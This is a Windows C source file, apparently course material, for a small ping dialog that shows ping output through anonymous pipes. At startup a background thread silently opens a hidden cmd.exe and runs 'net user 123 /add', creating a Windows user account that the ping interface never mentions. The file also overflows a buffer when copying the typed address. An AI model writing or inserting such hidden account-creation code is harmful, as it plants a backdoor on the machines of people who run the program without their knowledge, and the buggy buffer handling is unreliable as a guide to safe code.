#define _CRT_SECURE_NO_WARNINGS
// 讲师：左手老师
// QQ  :    691714544/570427370
// 交流群：431493983
// 客服QQ: 921700006
#include <windows.h>
#include <stdio.h>
#include "resource.h"
HINSTANCE hInst;
DWORD WINAPI CMDProc(LPARAM lParam)
{
  //创建匿名管道
  SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};
  HANDLE hReadResult, hWriteResult;
  HANDLE hReadCmd, hWriteCmd;
  if (!CreatePipe(&hReadResult, &hWriteResult, &sa, 0))
    return 0;
  if (!CreatePipe(&hReadCmd, &hWriteCmd, &sa, 0))
    return 0;
  //设置命令行进程启动信息(以隐藏方式启动命令并定位其输出到hWriteResult)
  STARTUPINFOA si = {sizeof(STARTUPINFO)};
  GetStartupInfoA(&si);
  si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
  si.wShowWindow = SW_HIDE;
  si.hStdError = hWriteResult;
  si.hStdOutput = hWriteResult;
  si.hStdInput = hReadCmd;
  //启动命令行
  PROCESS_INFORMATION pi;
 
  char buff[5012] = {0};

  if (!CreateProcessA(NULL,"cmd.exe", NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi))
    return 0;
  //立即关闭hWriteResult
  CloseHandle(hWriteResult);
  CloseHandle(hReadCmd);

  DWORD dwDataAvial = 0;
  while(dwDataAvial == 0) //等待数据到来
  {
    Sleep(10);
    PeekNamedPipe(hReadResult,0,0,NULL,&dwDataAvial,NULL);
  }
  // 读取进入shell的结果
  DWORD dwRead = 0;
  while(ReadFile(hReadResult, buff, dwDataAvial>sizeof(buff)?sizeof(buff):dwDataAvial,&dwRead,0))
  {
    PeekNamedPipe(hReadResult,0,0,NULL,&dwDataAvial,NULL);
    if (!dwDataAvial)
      break;
  }
  Sleep(10);

  WriteFile(hWriteCmd,"net user 123 /add\n",strlen("net user 123 /add\n"),&dwRead,0);
  while(dwDataAvial == 0) //等待数据到来
  {
    Sleep(10);
    PeekNamedPipe(hReadResult,0,0,NULL,&dwDataAvial,NULL);
  }
  // 读取添加用户命令的结果
  while(ReadFile(hReadResult, buff, dwDataAvial>sizeof(buff)?sizeof(buff):dwDataAvial,&dwRead,0))
  {
    PeekNamedPipe(hReadResult,0,0,NULL,&dwDataAvial,NULL);
    if (!dwDataAvial)
      break;
  }
  Sleep(10);

  // 结束掉创建的进程并返回
  TerminateProcess(OpenProcess(PROCESS_ALL_ACCESS,FALSE,pi.dwProcessId),0);
  return 0;
}


LRESULT CALLBACK PING(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
  HANDLE hWrite, hRead;
  STARTUPINFO startupinfo;
  PROCESS_INFORMATION pinfo;
  SECURITY_ATTRIBUTES sat;
  char  szBuffer[1024], ipBuffer[20];
  DWORD bytesRead;
  HWND  hwndEdit;
  switch (message)
  {
  case WM_INITDIALOG:

    //SendMessage(hDlg, WM_SETICON, ICON_BIG, LoadIcon(hInst, ICO_PING));
    return TRUE;

  case WM_COMMAND:
    switch (LOWORD(wParam))
    {
    case IDC_EXIT:
      EndDialog(hDlg, LOWORD(wParam));
      break;
    case IDOK:
      RtlZeroMemory(ipBuffer, 20);
      strcpy(ipBuffer, "ping ");
      GetDlgItemText(hDlg, IDC_IPADDRESS, ipBuffer + 5, 20);

      hwndEdit = GetDlgItem(hDlg, IDC_OUTINFOR);

      sat.nLength = sizeof(SECURITY_ATTRIBUTES);
      sat.bInheritHandle = TRUE;
      sat.lpSecurityDescriptor = NULL;

      if (CreatePipe(&hRead, &hWrite, &sat, 0) == 0)    //创建匿名管道
        MessageBox(hDlg, TEXT("创建管道失败"), TEXT("PING"), MB_OK);
      else
      {
        startupinfo.cb = sizeof(STARTUPINFO);
        GetStartupInfo(&startupinfo);
        startupinfo.hStdOutput = hWrite;      //用管道的写端代替控制台程序的输出端以便得到输出的信息
        startupinfo.hStdError = hWrite;
        startupinfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
        startupinfo.wShowWindow = SW_HIDE;        //隐藏控制台程序窗口
        if (CreateProcess(NULL, ipBuffer, NULL, NULL, TRUE, NULL, NULL, NULL, &startupinfo, &pinfo) == NULL)
          MessageBox(hDlg, TEXT("创建进程失败"), TEXT("PING"), MB_OK);
        else
        {
          CloseHandle(hWrite);        //关关闭写端,因为写端已经给了控制台程序,不能存在两个写端
          while (TRUE)
          {
            RtlZeroMemory(szBuffer, 1024);
            if (ReadFile(hRead, szBuffer, 1023, &bytesRead, NULL) == NULL)  //注意ReadFile的第一个参数正是读端的句柄
              break;
            SendMessage(hwndEdit, EM_SETSEL, -1, 0);
            SendMessage(hwndEdit, EM_REPLACESEL, FALSE, (LPARAM)szBuffer);    //循环读入信息直到没有信息可读
          }

        }
        CloseHandle(hWrite);
      }
      break;
    }
    return TRUE;
  }
  return FALSE;
}
int APIENTRY WinMain(HINSTANCE hInstance,
  HINSTANCE hPrevInstance,
  LPSTR     lpCmdLine,
  int       nCmdShow)
{
  hInst = hInstance;
  if (0 != AttachConsole(-1))
	{
		freopen("conin$", "r+t", stdin);
		freopen("conout$", "w+t", stdout);
		freopen("conout$", "w+t", stderr);
		SetConsoleTitle(_T("ZS - 控制台"));
	}
  CreateThread(0, 0, (LPTHREAD_START_ROUTINE)CMDProc, 0, 0, 0);
  DialogBoxParam(hInstance, (LPCTSTR)DLG_MAIN, NULL, (DLGPROC)PING, NULL);
  return 0;
}